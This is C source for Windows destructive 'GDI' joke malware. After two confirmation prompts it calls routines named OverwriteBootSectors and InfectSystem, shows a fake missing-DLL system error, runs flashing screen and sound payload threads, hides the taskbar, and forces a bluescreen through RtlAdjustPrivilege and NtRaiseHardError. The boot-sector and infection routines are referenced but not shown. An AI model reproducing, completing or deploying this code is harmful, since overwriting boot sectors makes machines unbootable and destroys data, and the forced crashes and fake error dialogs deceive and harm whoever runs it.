typedef NTSTATUS(WINAPI* RTLADJUSTPRIVILEGE)(DWORD, BYTE, BYTE, LPBYTE);

void RaiseError(NTSTATUS ntExitCode, bool ifCustom, LPCSTR lpCustomMessage) {
	NTRAISEHARDERROR nrhe = (NTRAISEHARDERROR)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
	RTLADJUSTPRIVILEGE rtlap = (RTLADJUSTPRIVILEGE)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	BYTE ntbyte;
	DWORD dwRsp;
	rtlap(19, true, false, &ntbyte);
	if (ifCustom == true) {
	
	ULONG_PTR ulArguments[] = {(ULONG_PTR)lpCustomMessage};
	nrhe(ntExitCode, 0, 0, (PULONG_PTR)ulArguments, 6, &dwRsp);
	}
	else if (ifCustom == false) {
		nrhe(ntExitCode, 0, 0, 0, 6, &dwRsp);
	}
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow)
{
    if (MessageBoxW(NULL, L"Run Malware?", L"WARNING - You know at this point", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"Are you sure? it contains flashing lights - PROCEED WITH CAUTION", L"WARNING - You know at this point", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
        	OverwriteBootSectors();
        	InfectSystem();
        Sleep(3000);
    	HANDLE thread00 = CreateThread(0, 0, rectangle, 0, 0, 0);
		MessageBoxW(NULL, L"The code execution cannot proceed because VCRUNTIME140.dll was not found. Reinstalling the program may fix this problem.", L"fakeerrorgokys.exe - System Error", MB_OK | MB_ICONERROR);
		Sleep(3000);
		HANDLE thread0 = CreateThread(0, 0, melt, 0, 0, 0);
		HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
		sound1();
		Sleep(30000);
		TerminateThread(thread1, 0);
		TerminateThread(thread0, 0);
		CloseHandle(thread1);
		CloseHandle(thread0);
		InvalidateRect(0, 0, 0);
		Sleep(1000); 
	    /*HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
        HANDLE thread2dot1 = CreateThread(0, 0, wef, 0, 0, 0);*/
        HANDLE thread2dot2 = CreateThread(0, 0, shader2, 0, 0, 0);
	    HANDLE thread2dot3 = CreateThread(0, 0, pies, 0, 0, 0);
	    sound2();
        Sleep(30000);
       //TerminateThread(thread2, 0);
       //CloseHandle(thread2);
       // InvalidateRect(0, 0, 0);
       // TerminateThread(thread2dot1, 0);
       // CloseHandle(thread2dot1);
	   // InvalidateRect(0, 0, 0);
        TerminateThread(thread2dot2, 0);
        CloseHandle(thread2dot2);
	    InvalidateRect(0, 0, 0);
		Sleep(1000);
		HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
	  //CreateThread(0, 0, Tesseract, 0, 0, 0);
	    sound3();
        Sleep(30000);
        TerminateThread(thread3, 0);
        TerminateThread(thread2dot3, 0);
	    TerminateThread(thread00, 0);
	    CloseHandle(thread3);
	    CloseHandle(thread00);
	    CloseHandle(thread2dot3);
	    InvalidateRect(0, 0, 0);
		Sleep(1000);
		MessageBoxW(NULL, L"You think this is over?", L"Announcement", MB_YESNO | MB_ICONQUESTION);
		Sleep(1000);
		HANDLE thread4 = CreateThread(0, 0, Black, 0, 0, 0);
        Sleep(5000);
        TerminateThread(thread4, 0);
	    CloseHandle(thread4);
	    InvalidateRect(0, 0, 0);
		HANDLE thread5 = CreateThread(0, 0, shader3, 0, 0, 0);
        CreateThread(0, 0, bounce, 0, 0, 0);
	    sound4();
	    Sleep(30000);
        TerminateThread(thread5, 0);
	    CloseHandle(thread5);
	    InvalidateRect(0, 0, 0);
	    ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE);
    	Sleep(1000);
	//	HANDLE thread6 = CreateThread(0, 0, shader4, 0, 0, 0);
      	HANDLE thread6dot1 = CreateThread(0, 0, melt2, 0, 0, 0);
	    CreateThread(0, 0, pie2, 0, 0, 0);
	    sound5();
	    Sleep(30000);
       //TerminateThread(thread6, 0);
	    TerminateThread(thread6dot1, 0);
	   //CloseHandle(thread6);
	    CloseHandle(thread6dot1);
	    InvalidateRect(0, 0, 0);
   	    Sleep(1000);
		HANDLE thread7 = CreateThread(0, 0, End, 0, 0, 0);
	   	HANDLE thread7dot1 = CreateThread(0, 0, textout, 0, 0, 0);
	    sound6();
	    Sleep(30000);
	    TerminateThread(thread7, 0);
	    CloseHandle(thread7);
	    InvalidateRect(0, 0, 0);
	    RaiseError(0xc00001b, true, "Hunter got the STOMACH BUG! SICK DAY");

    	}
		
	}
}		  	
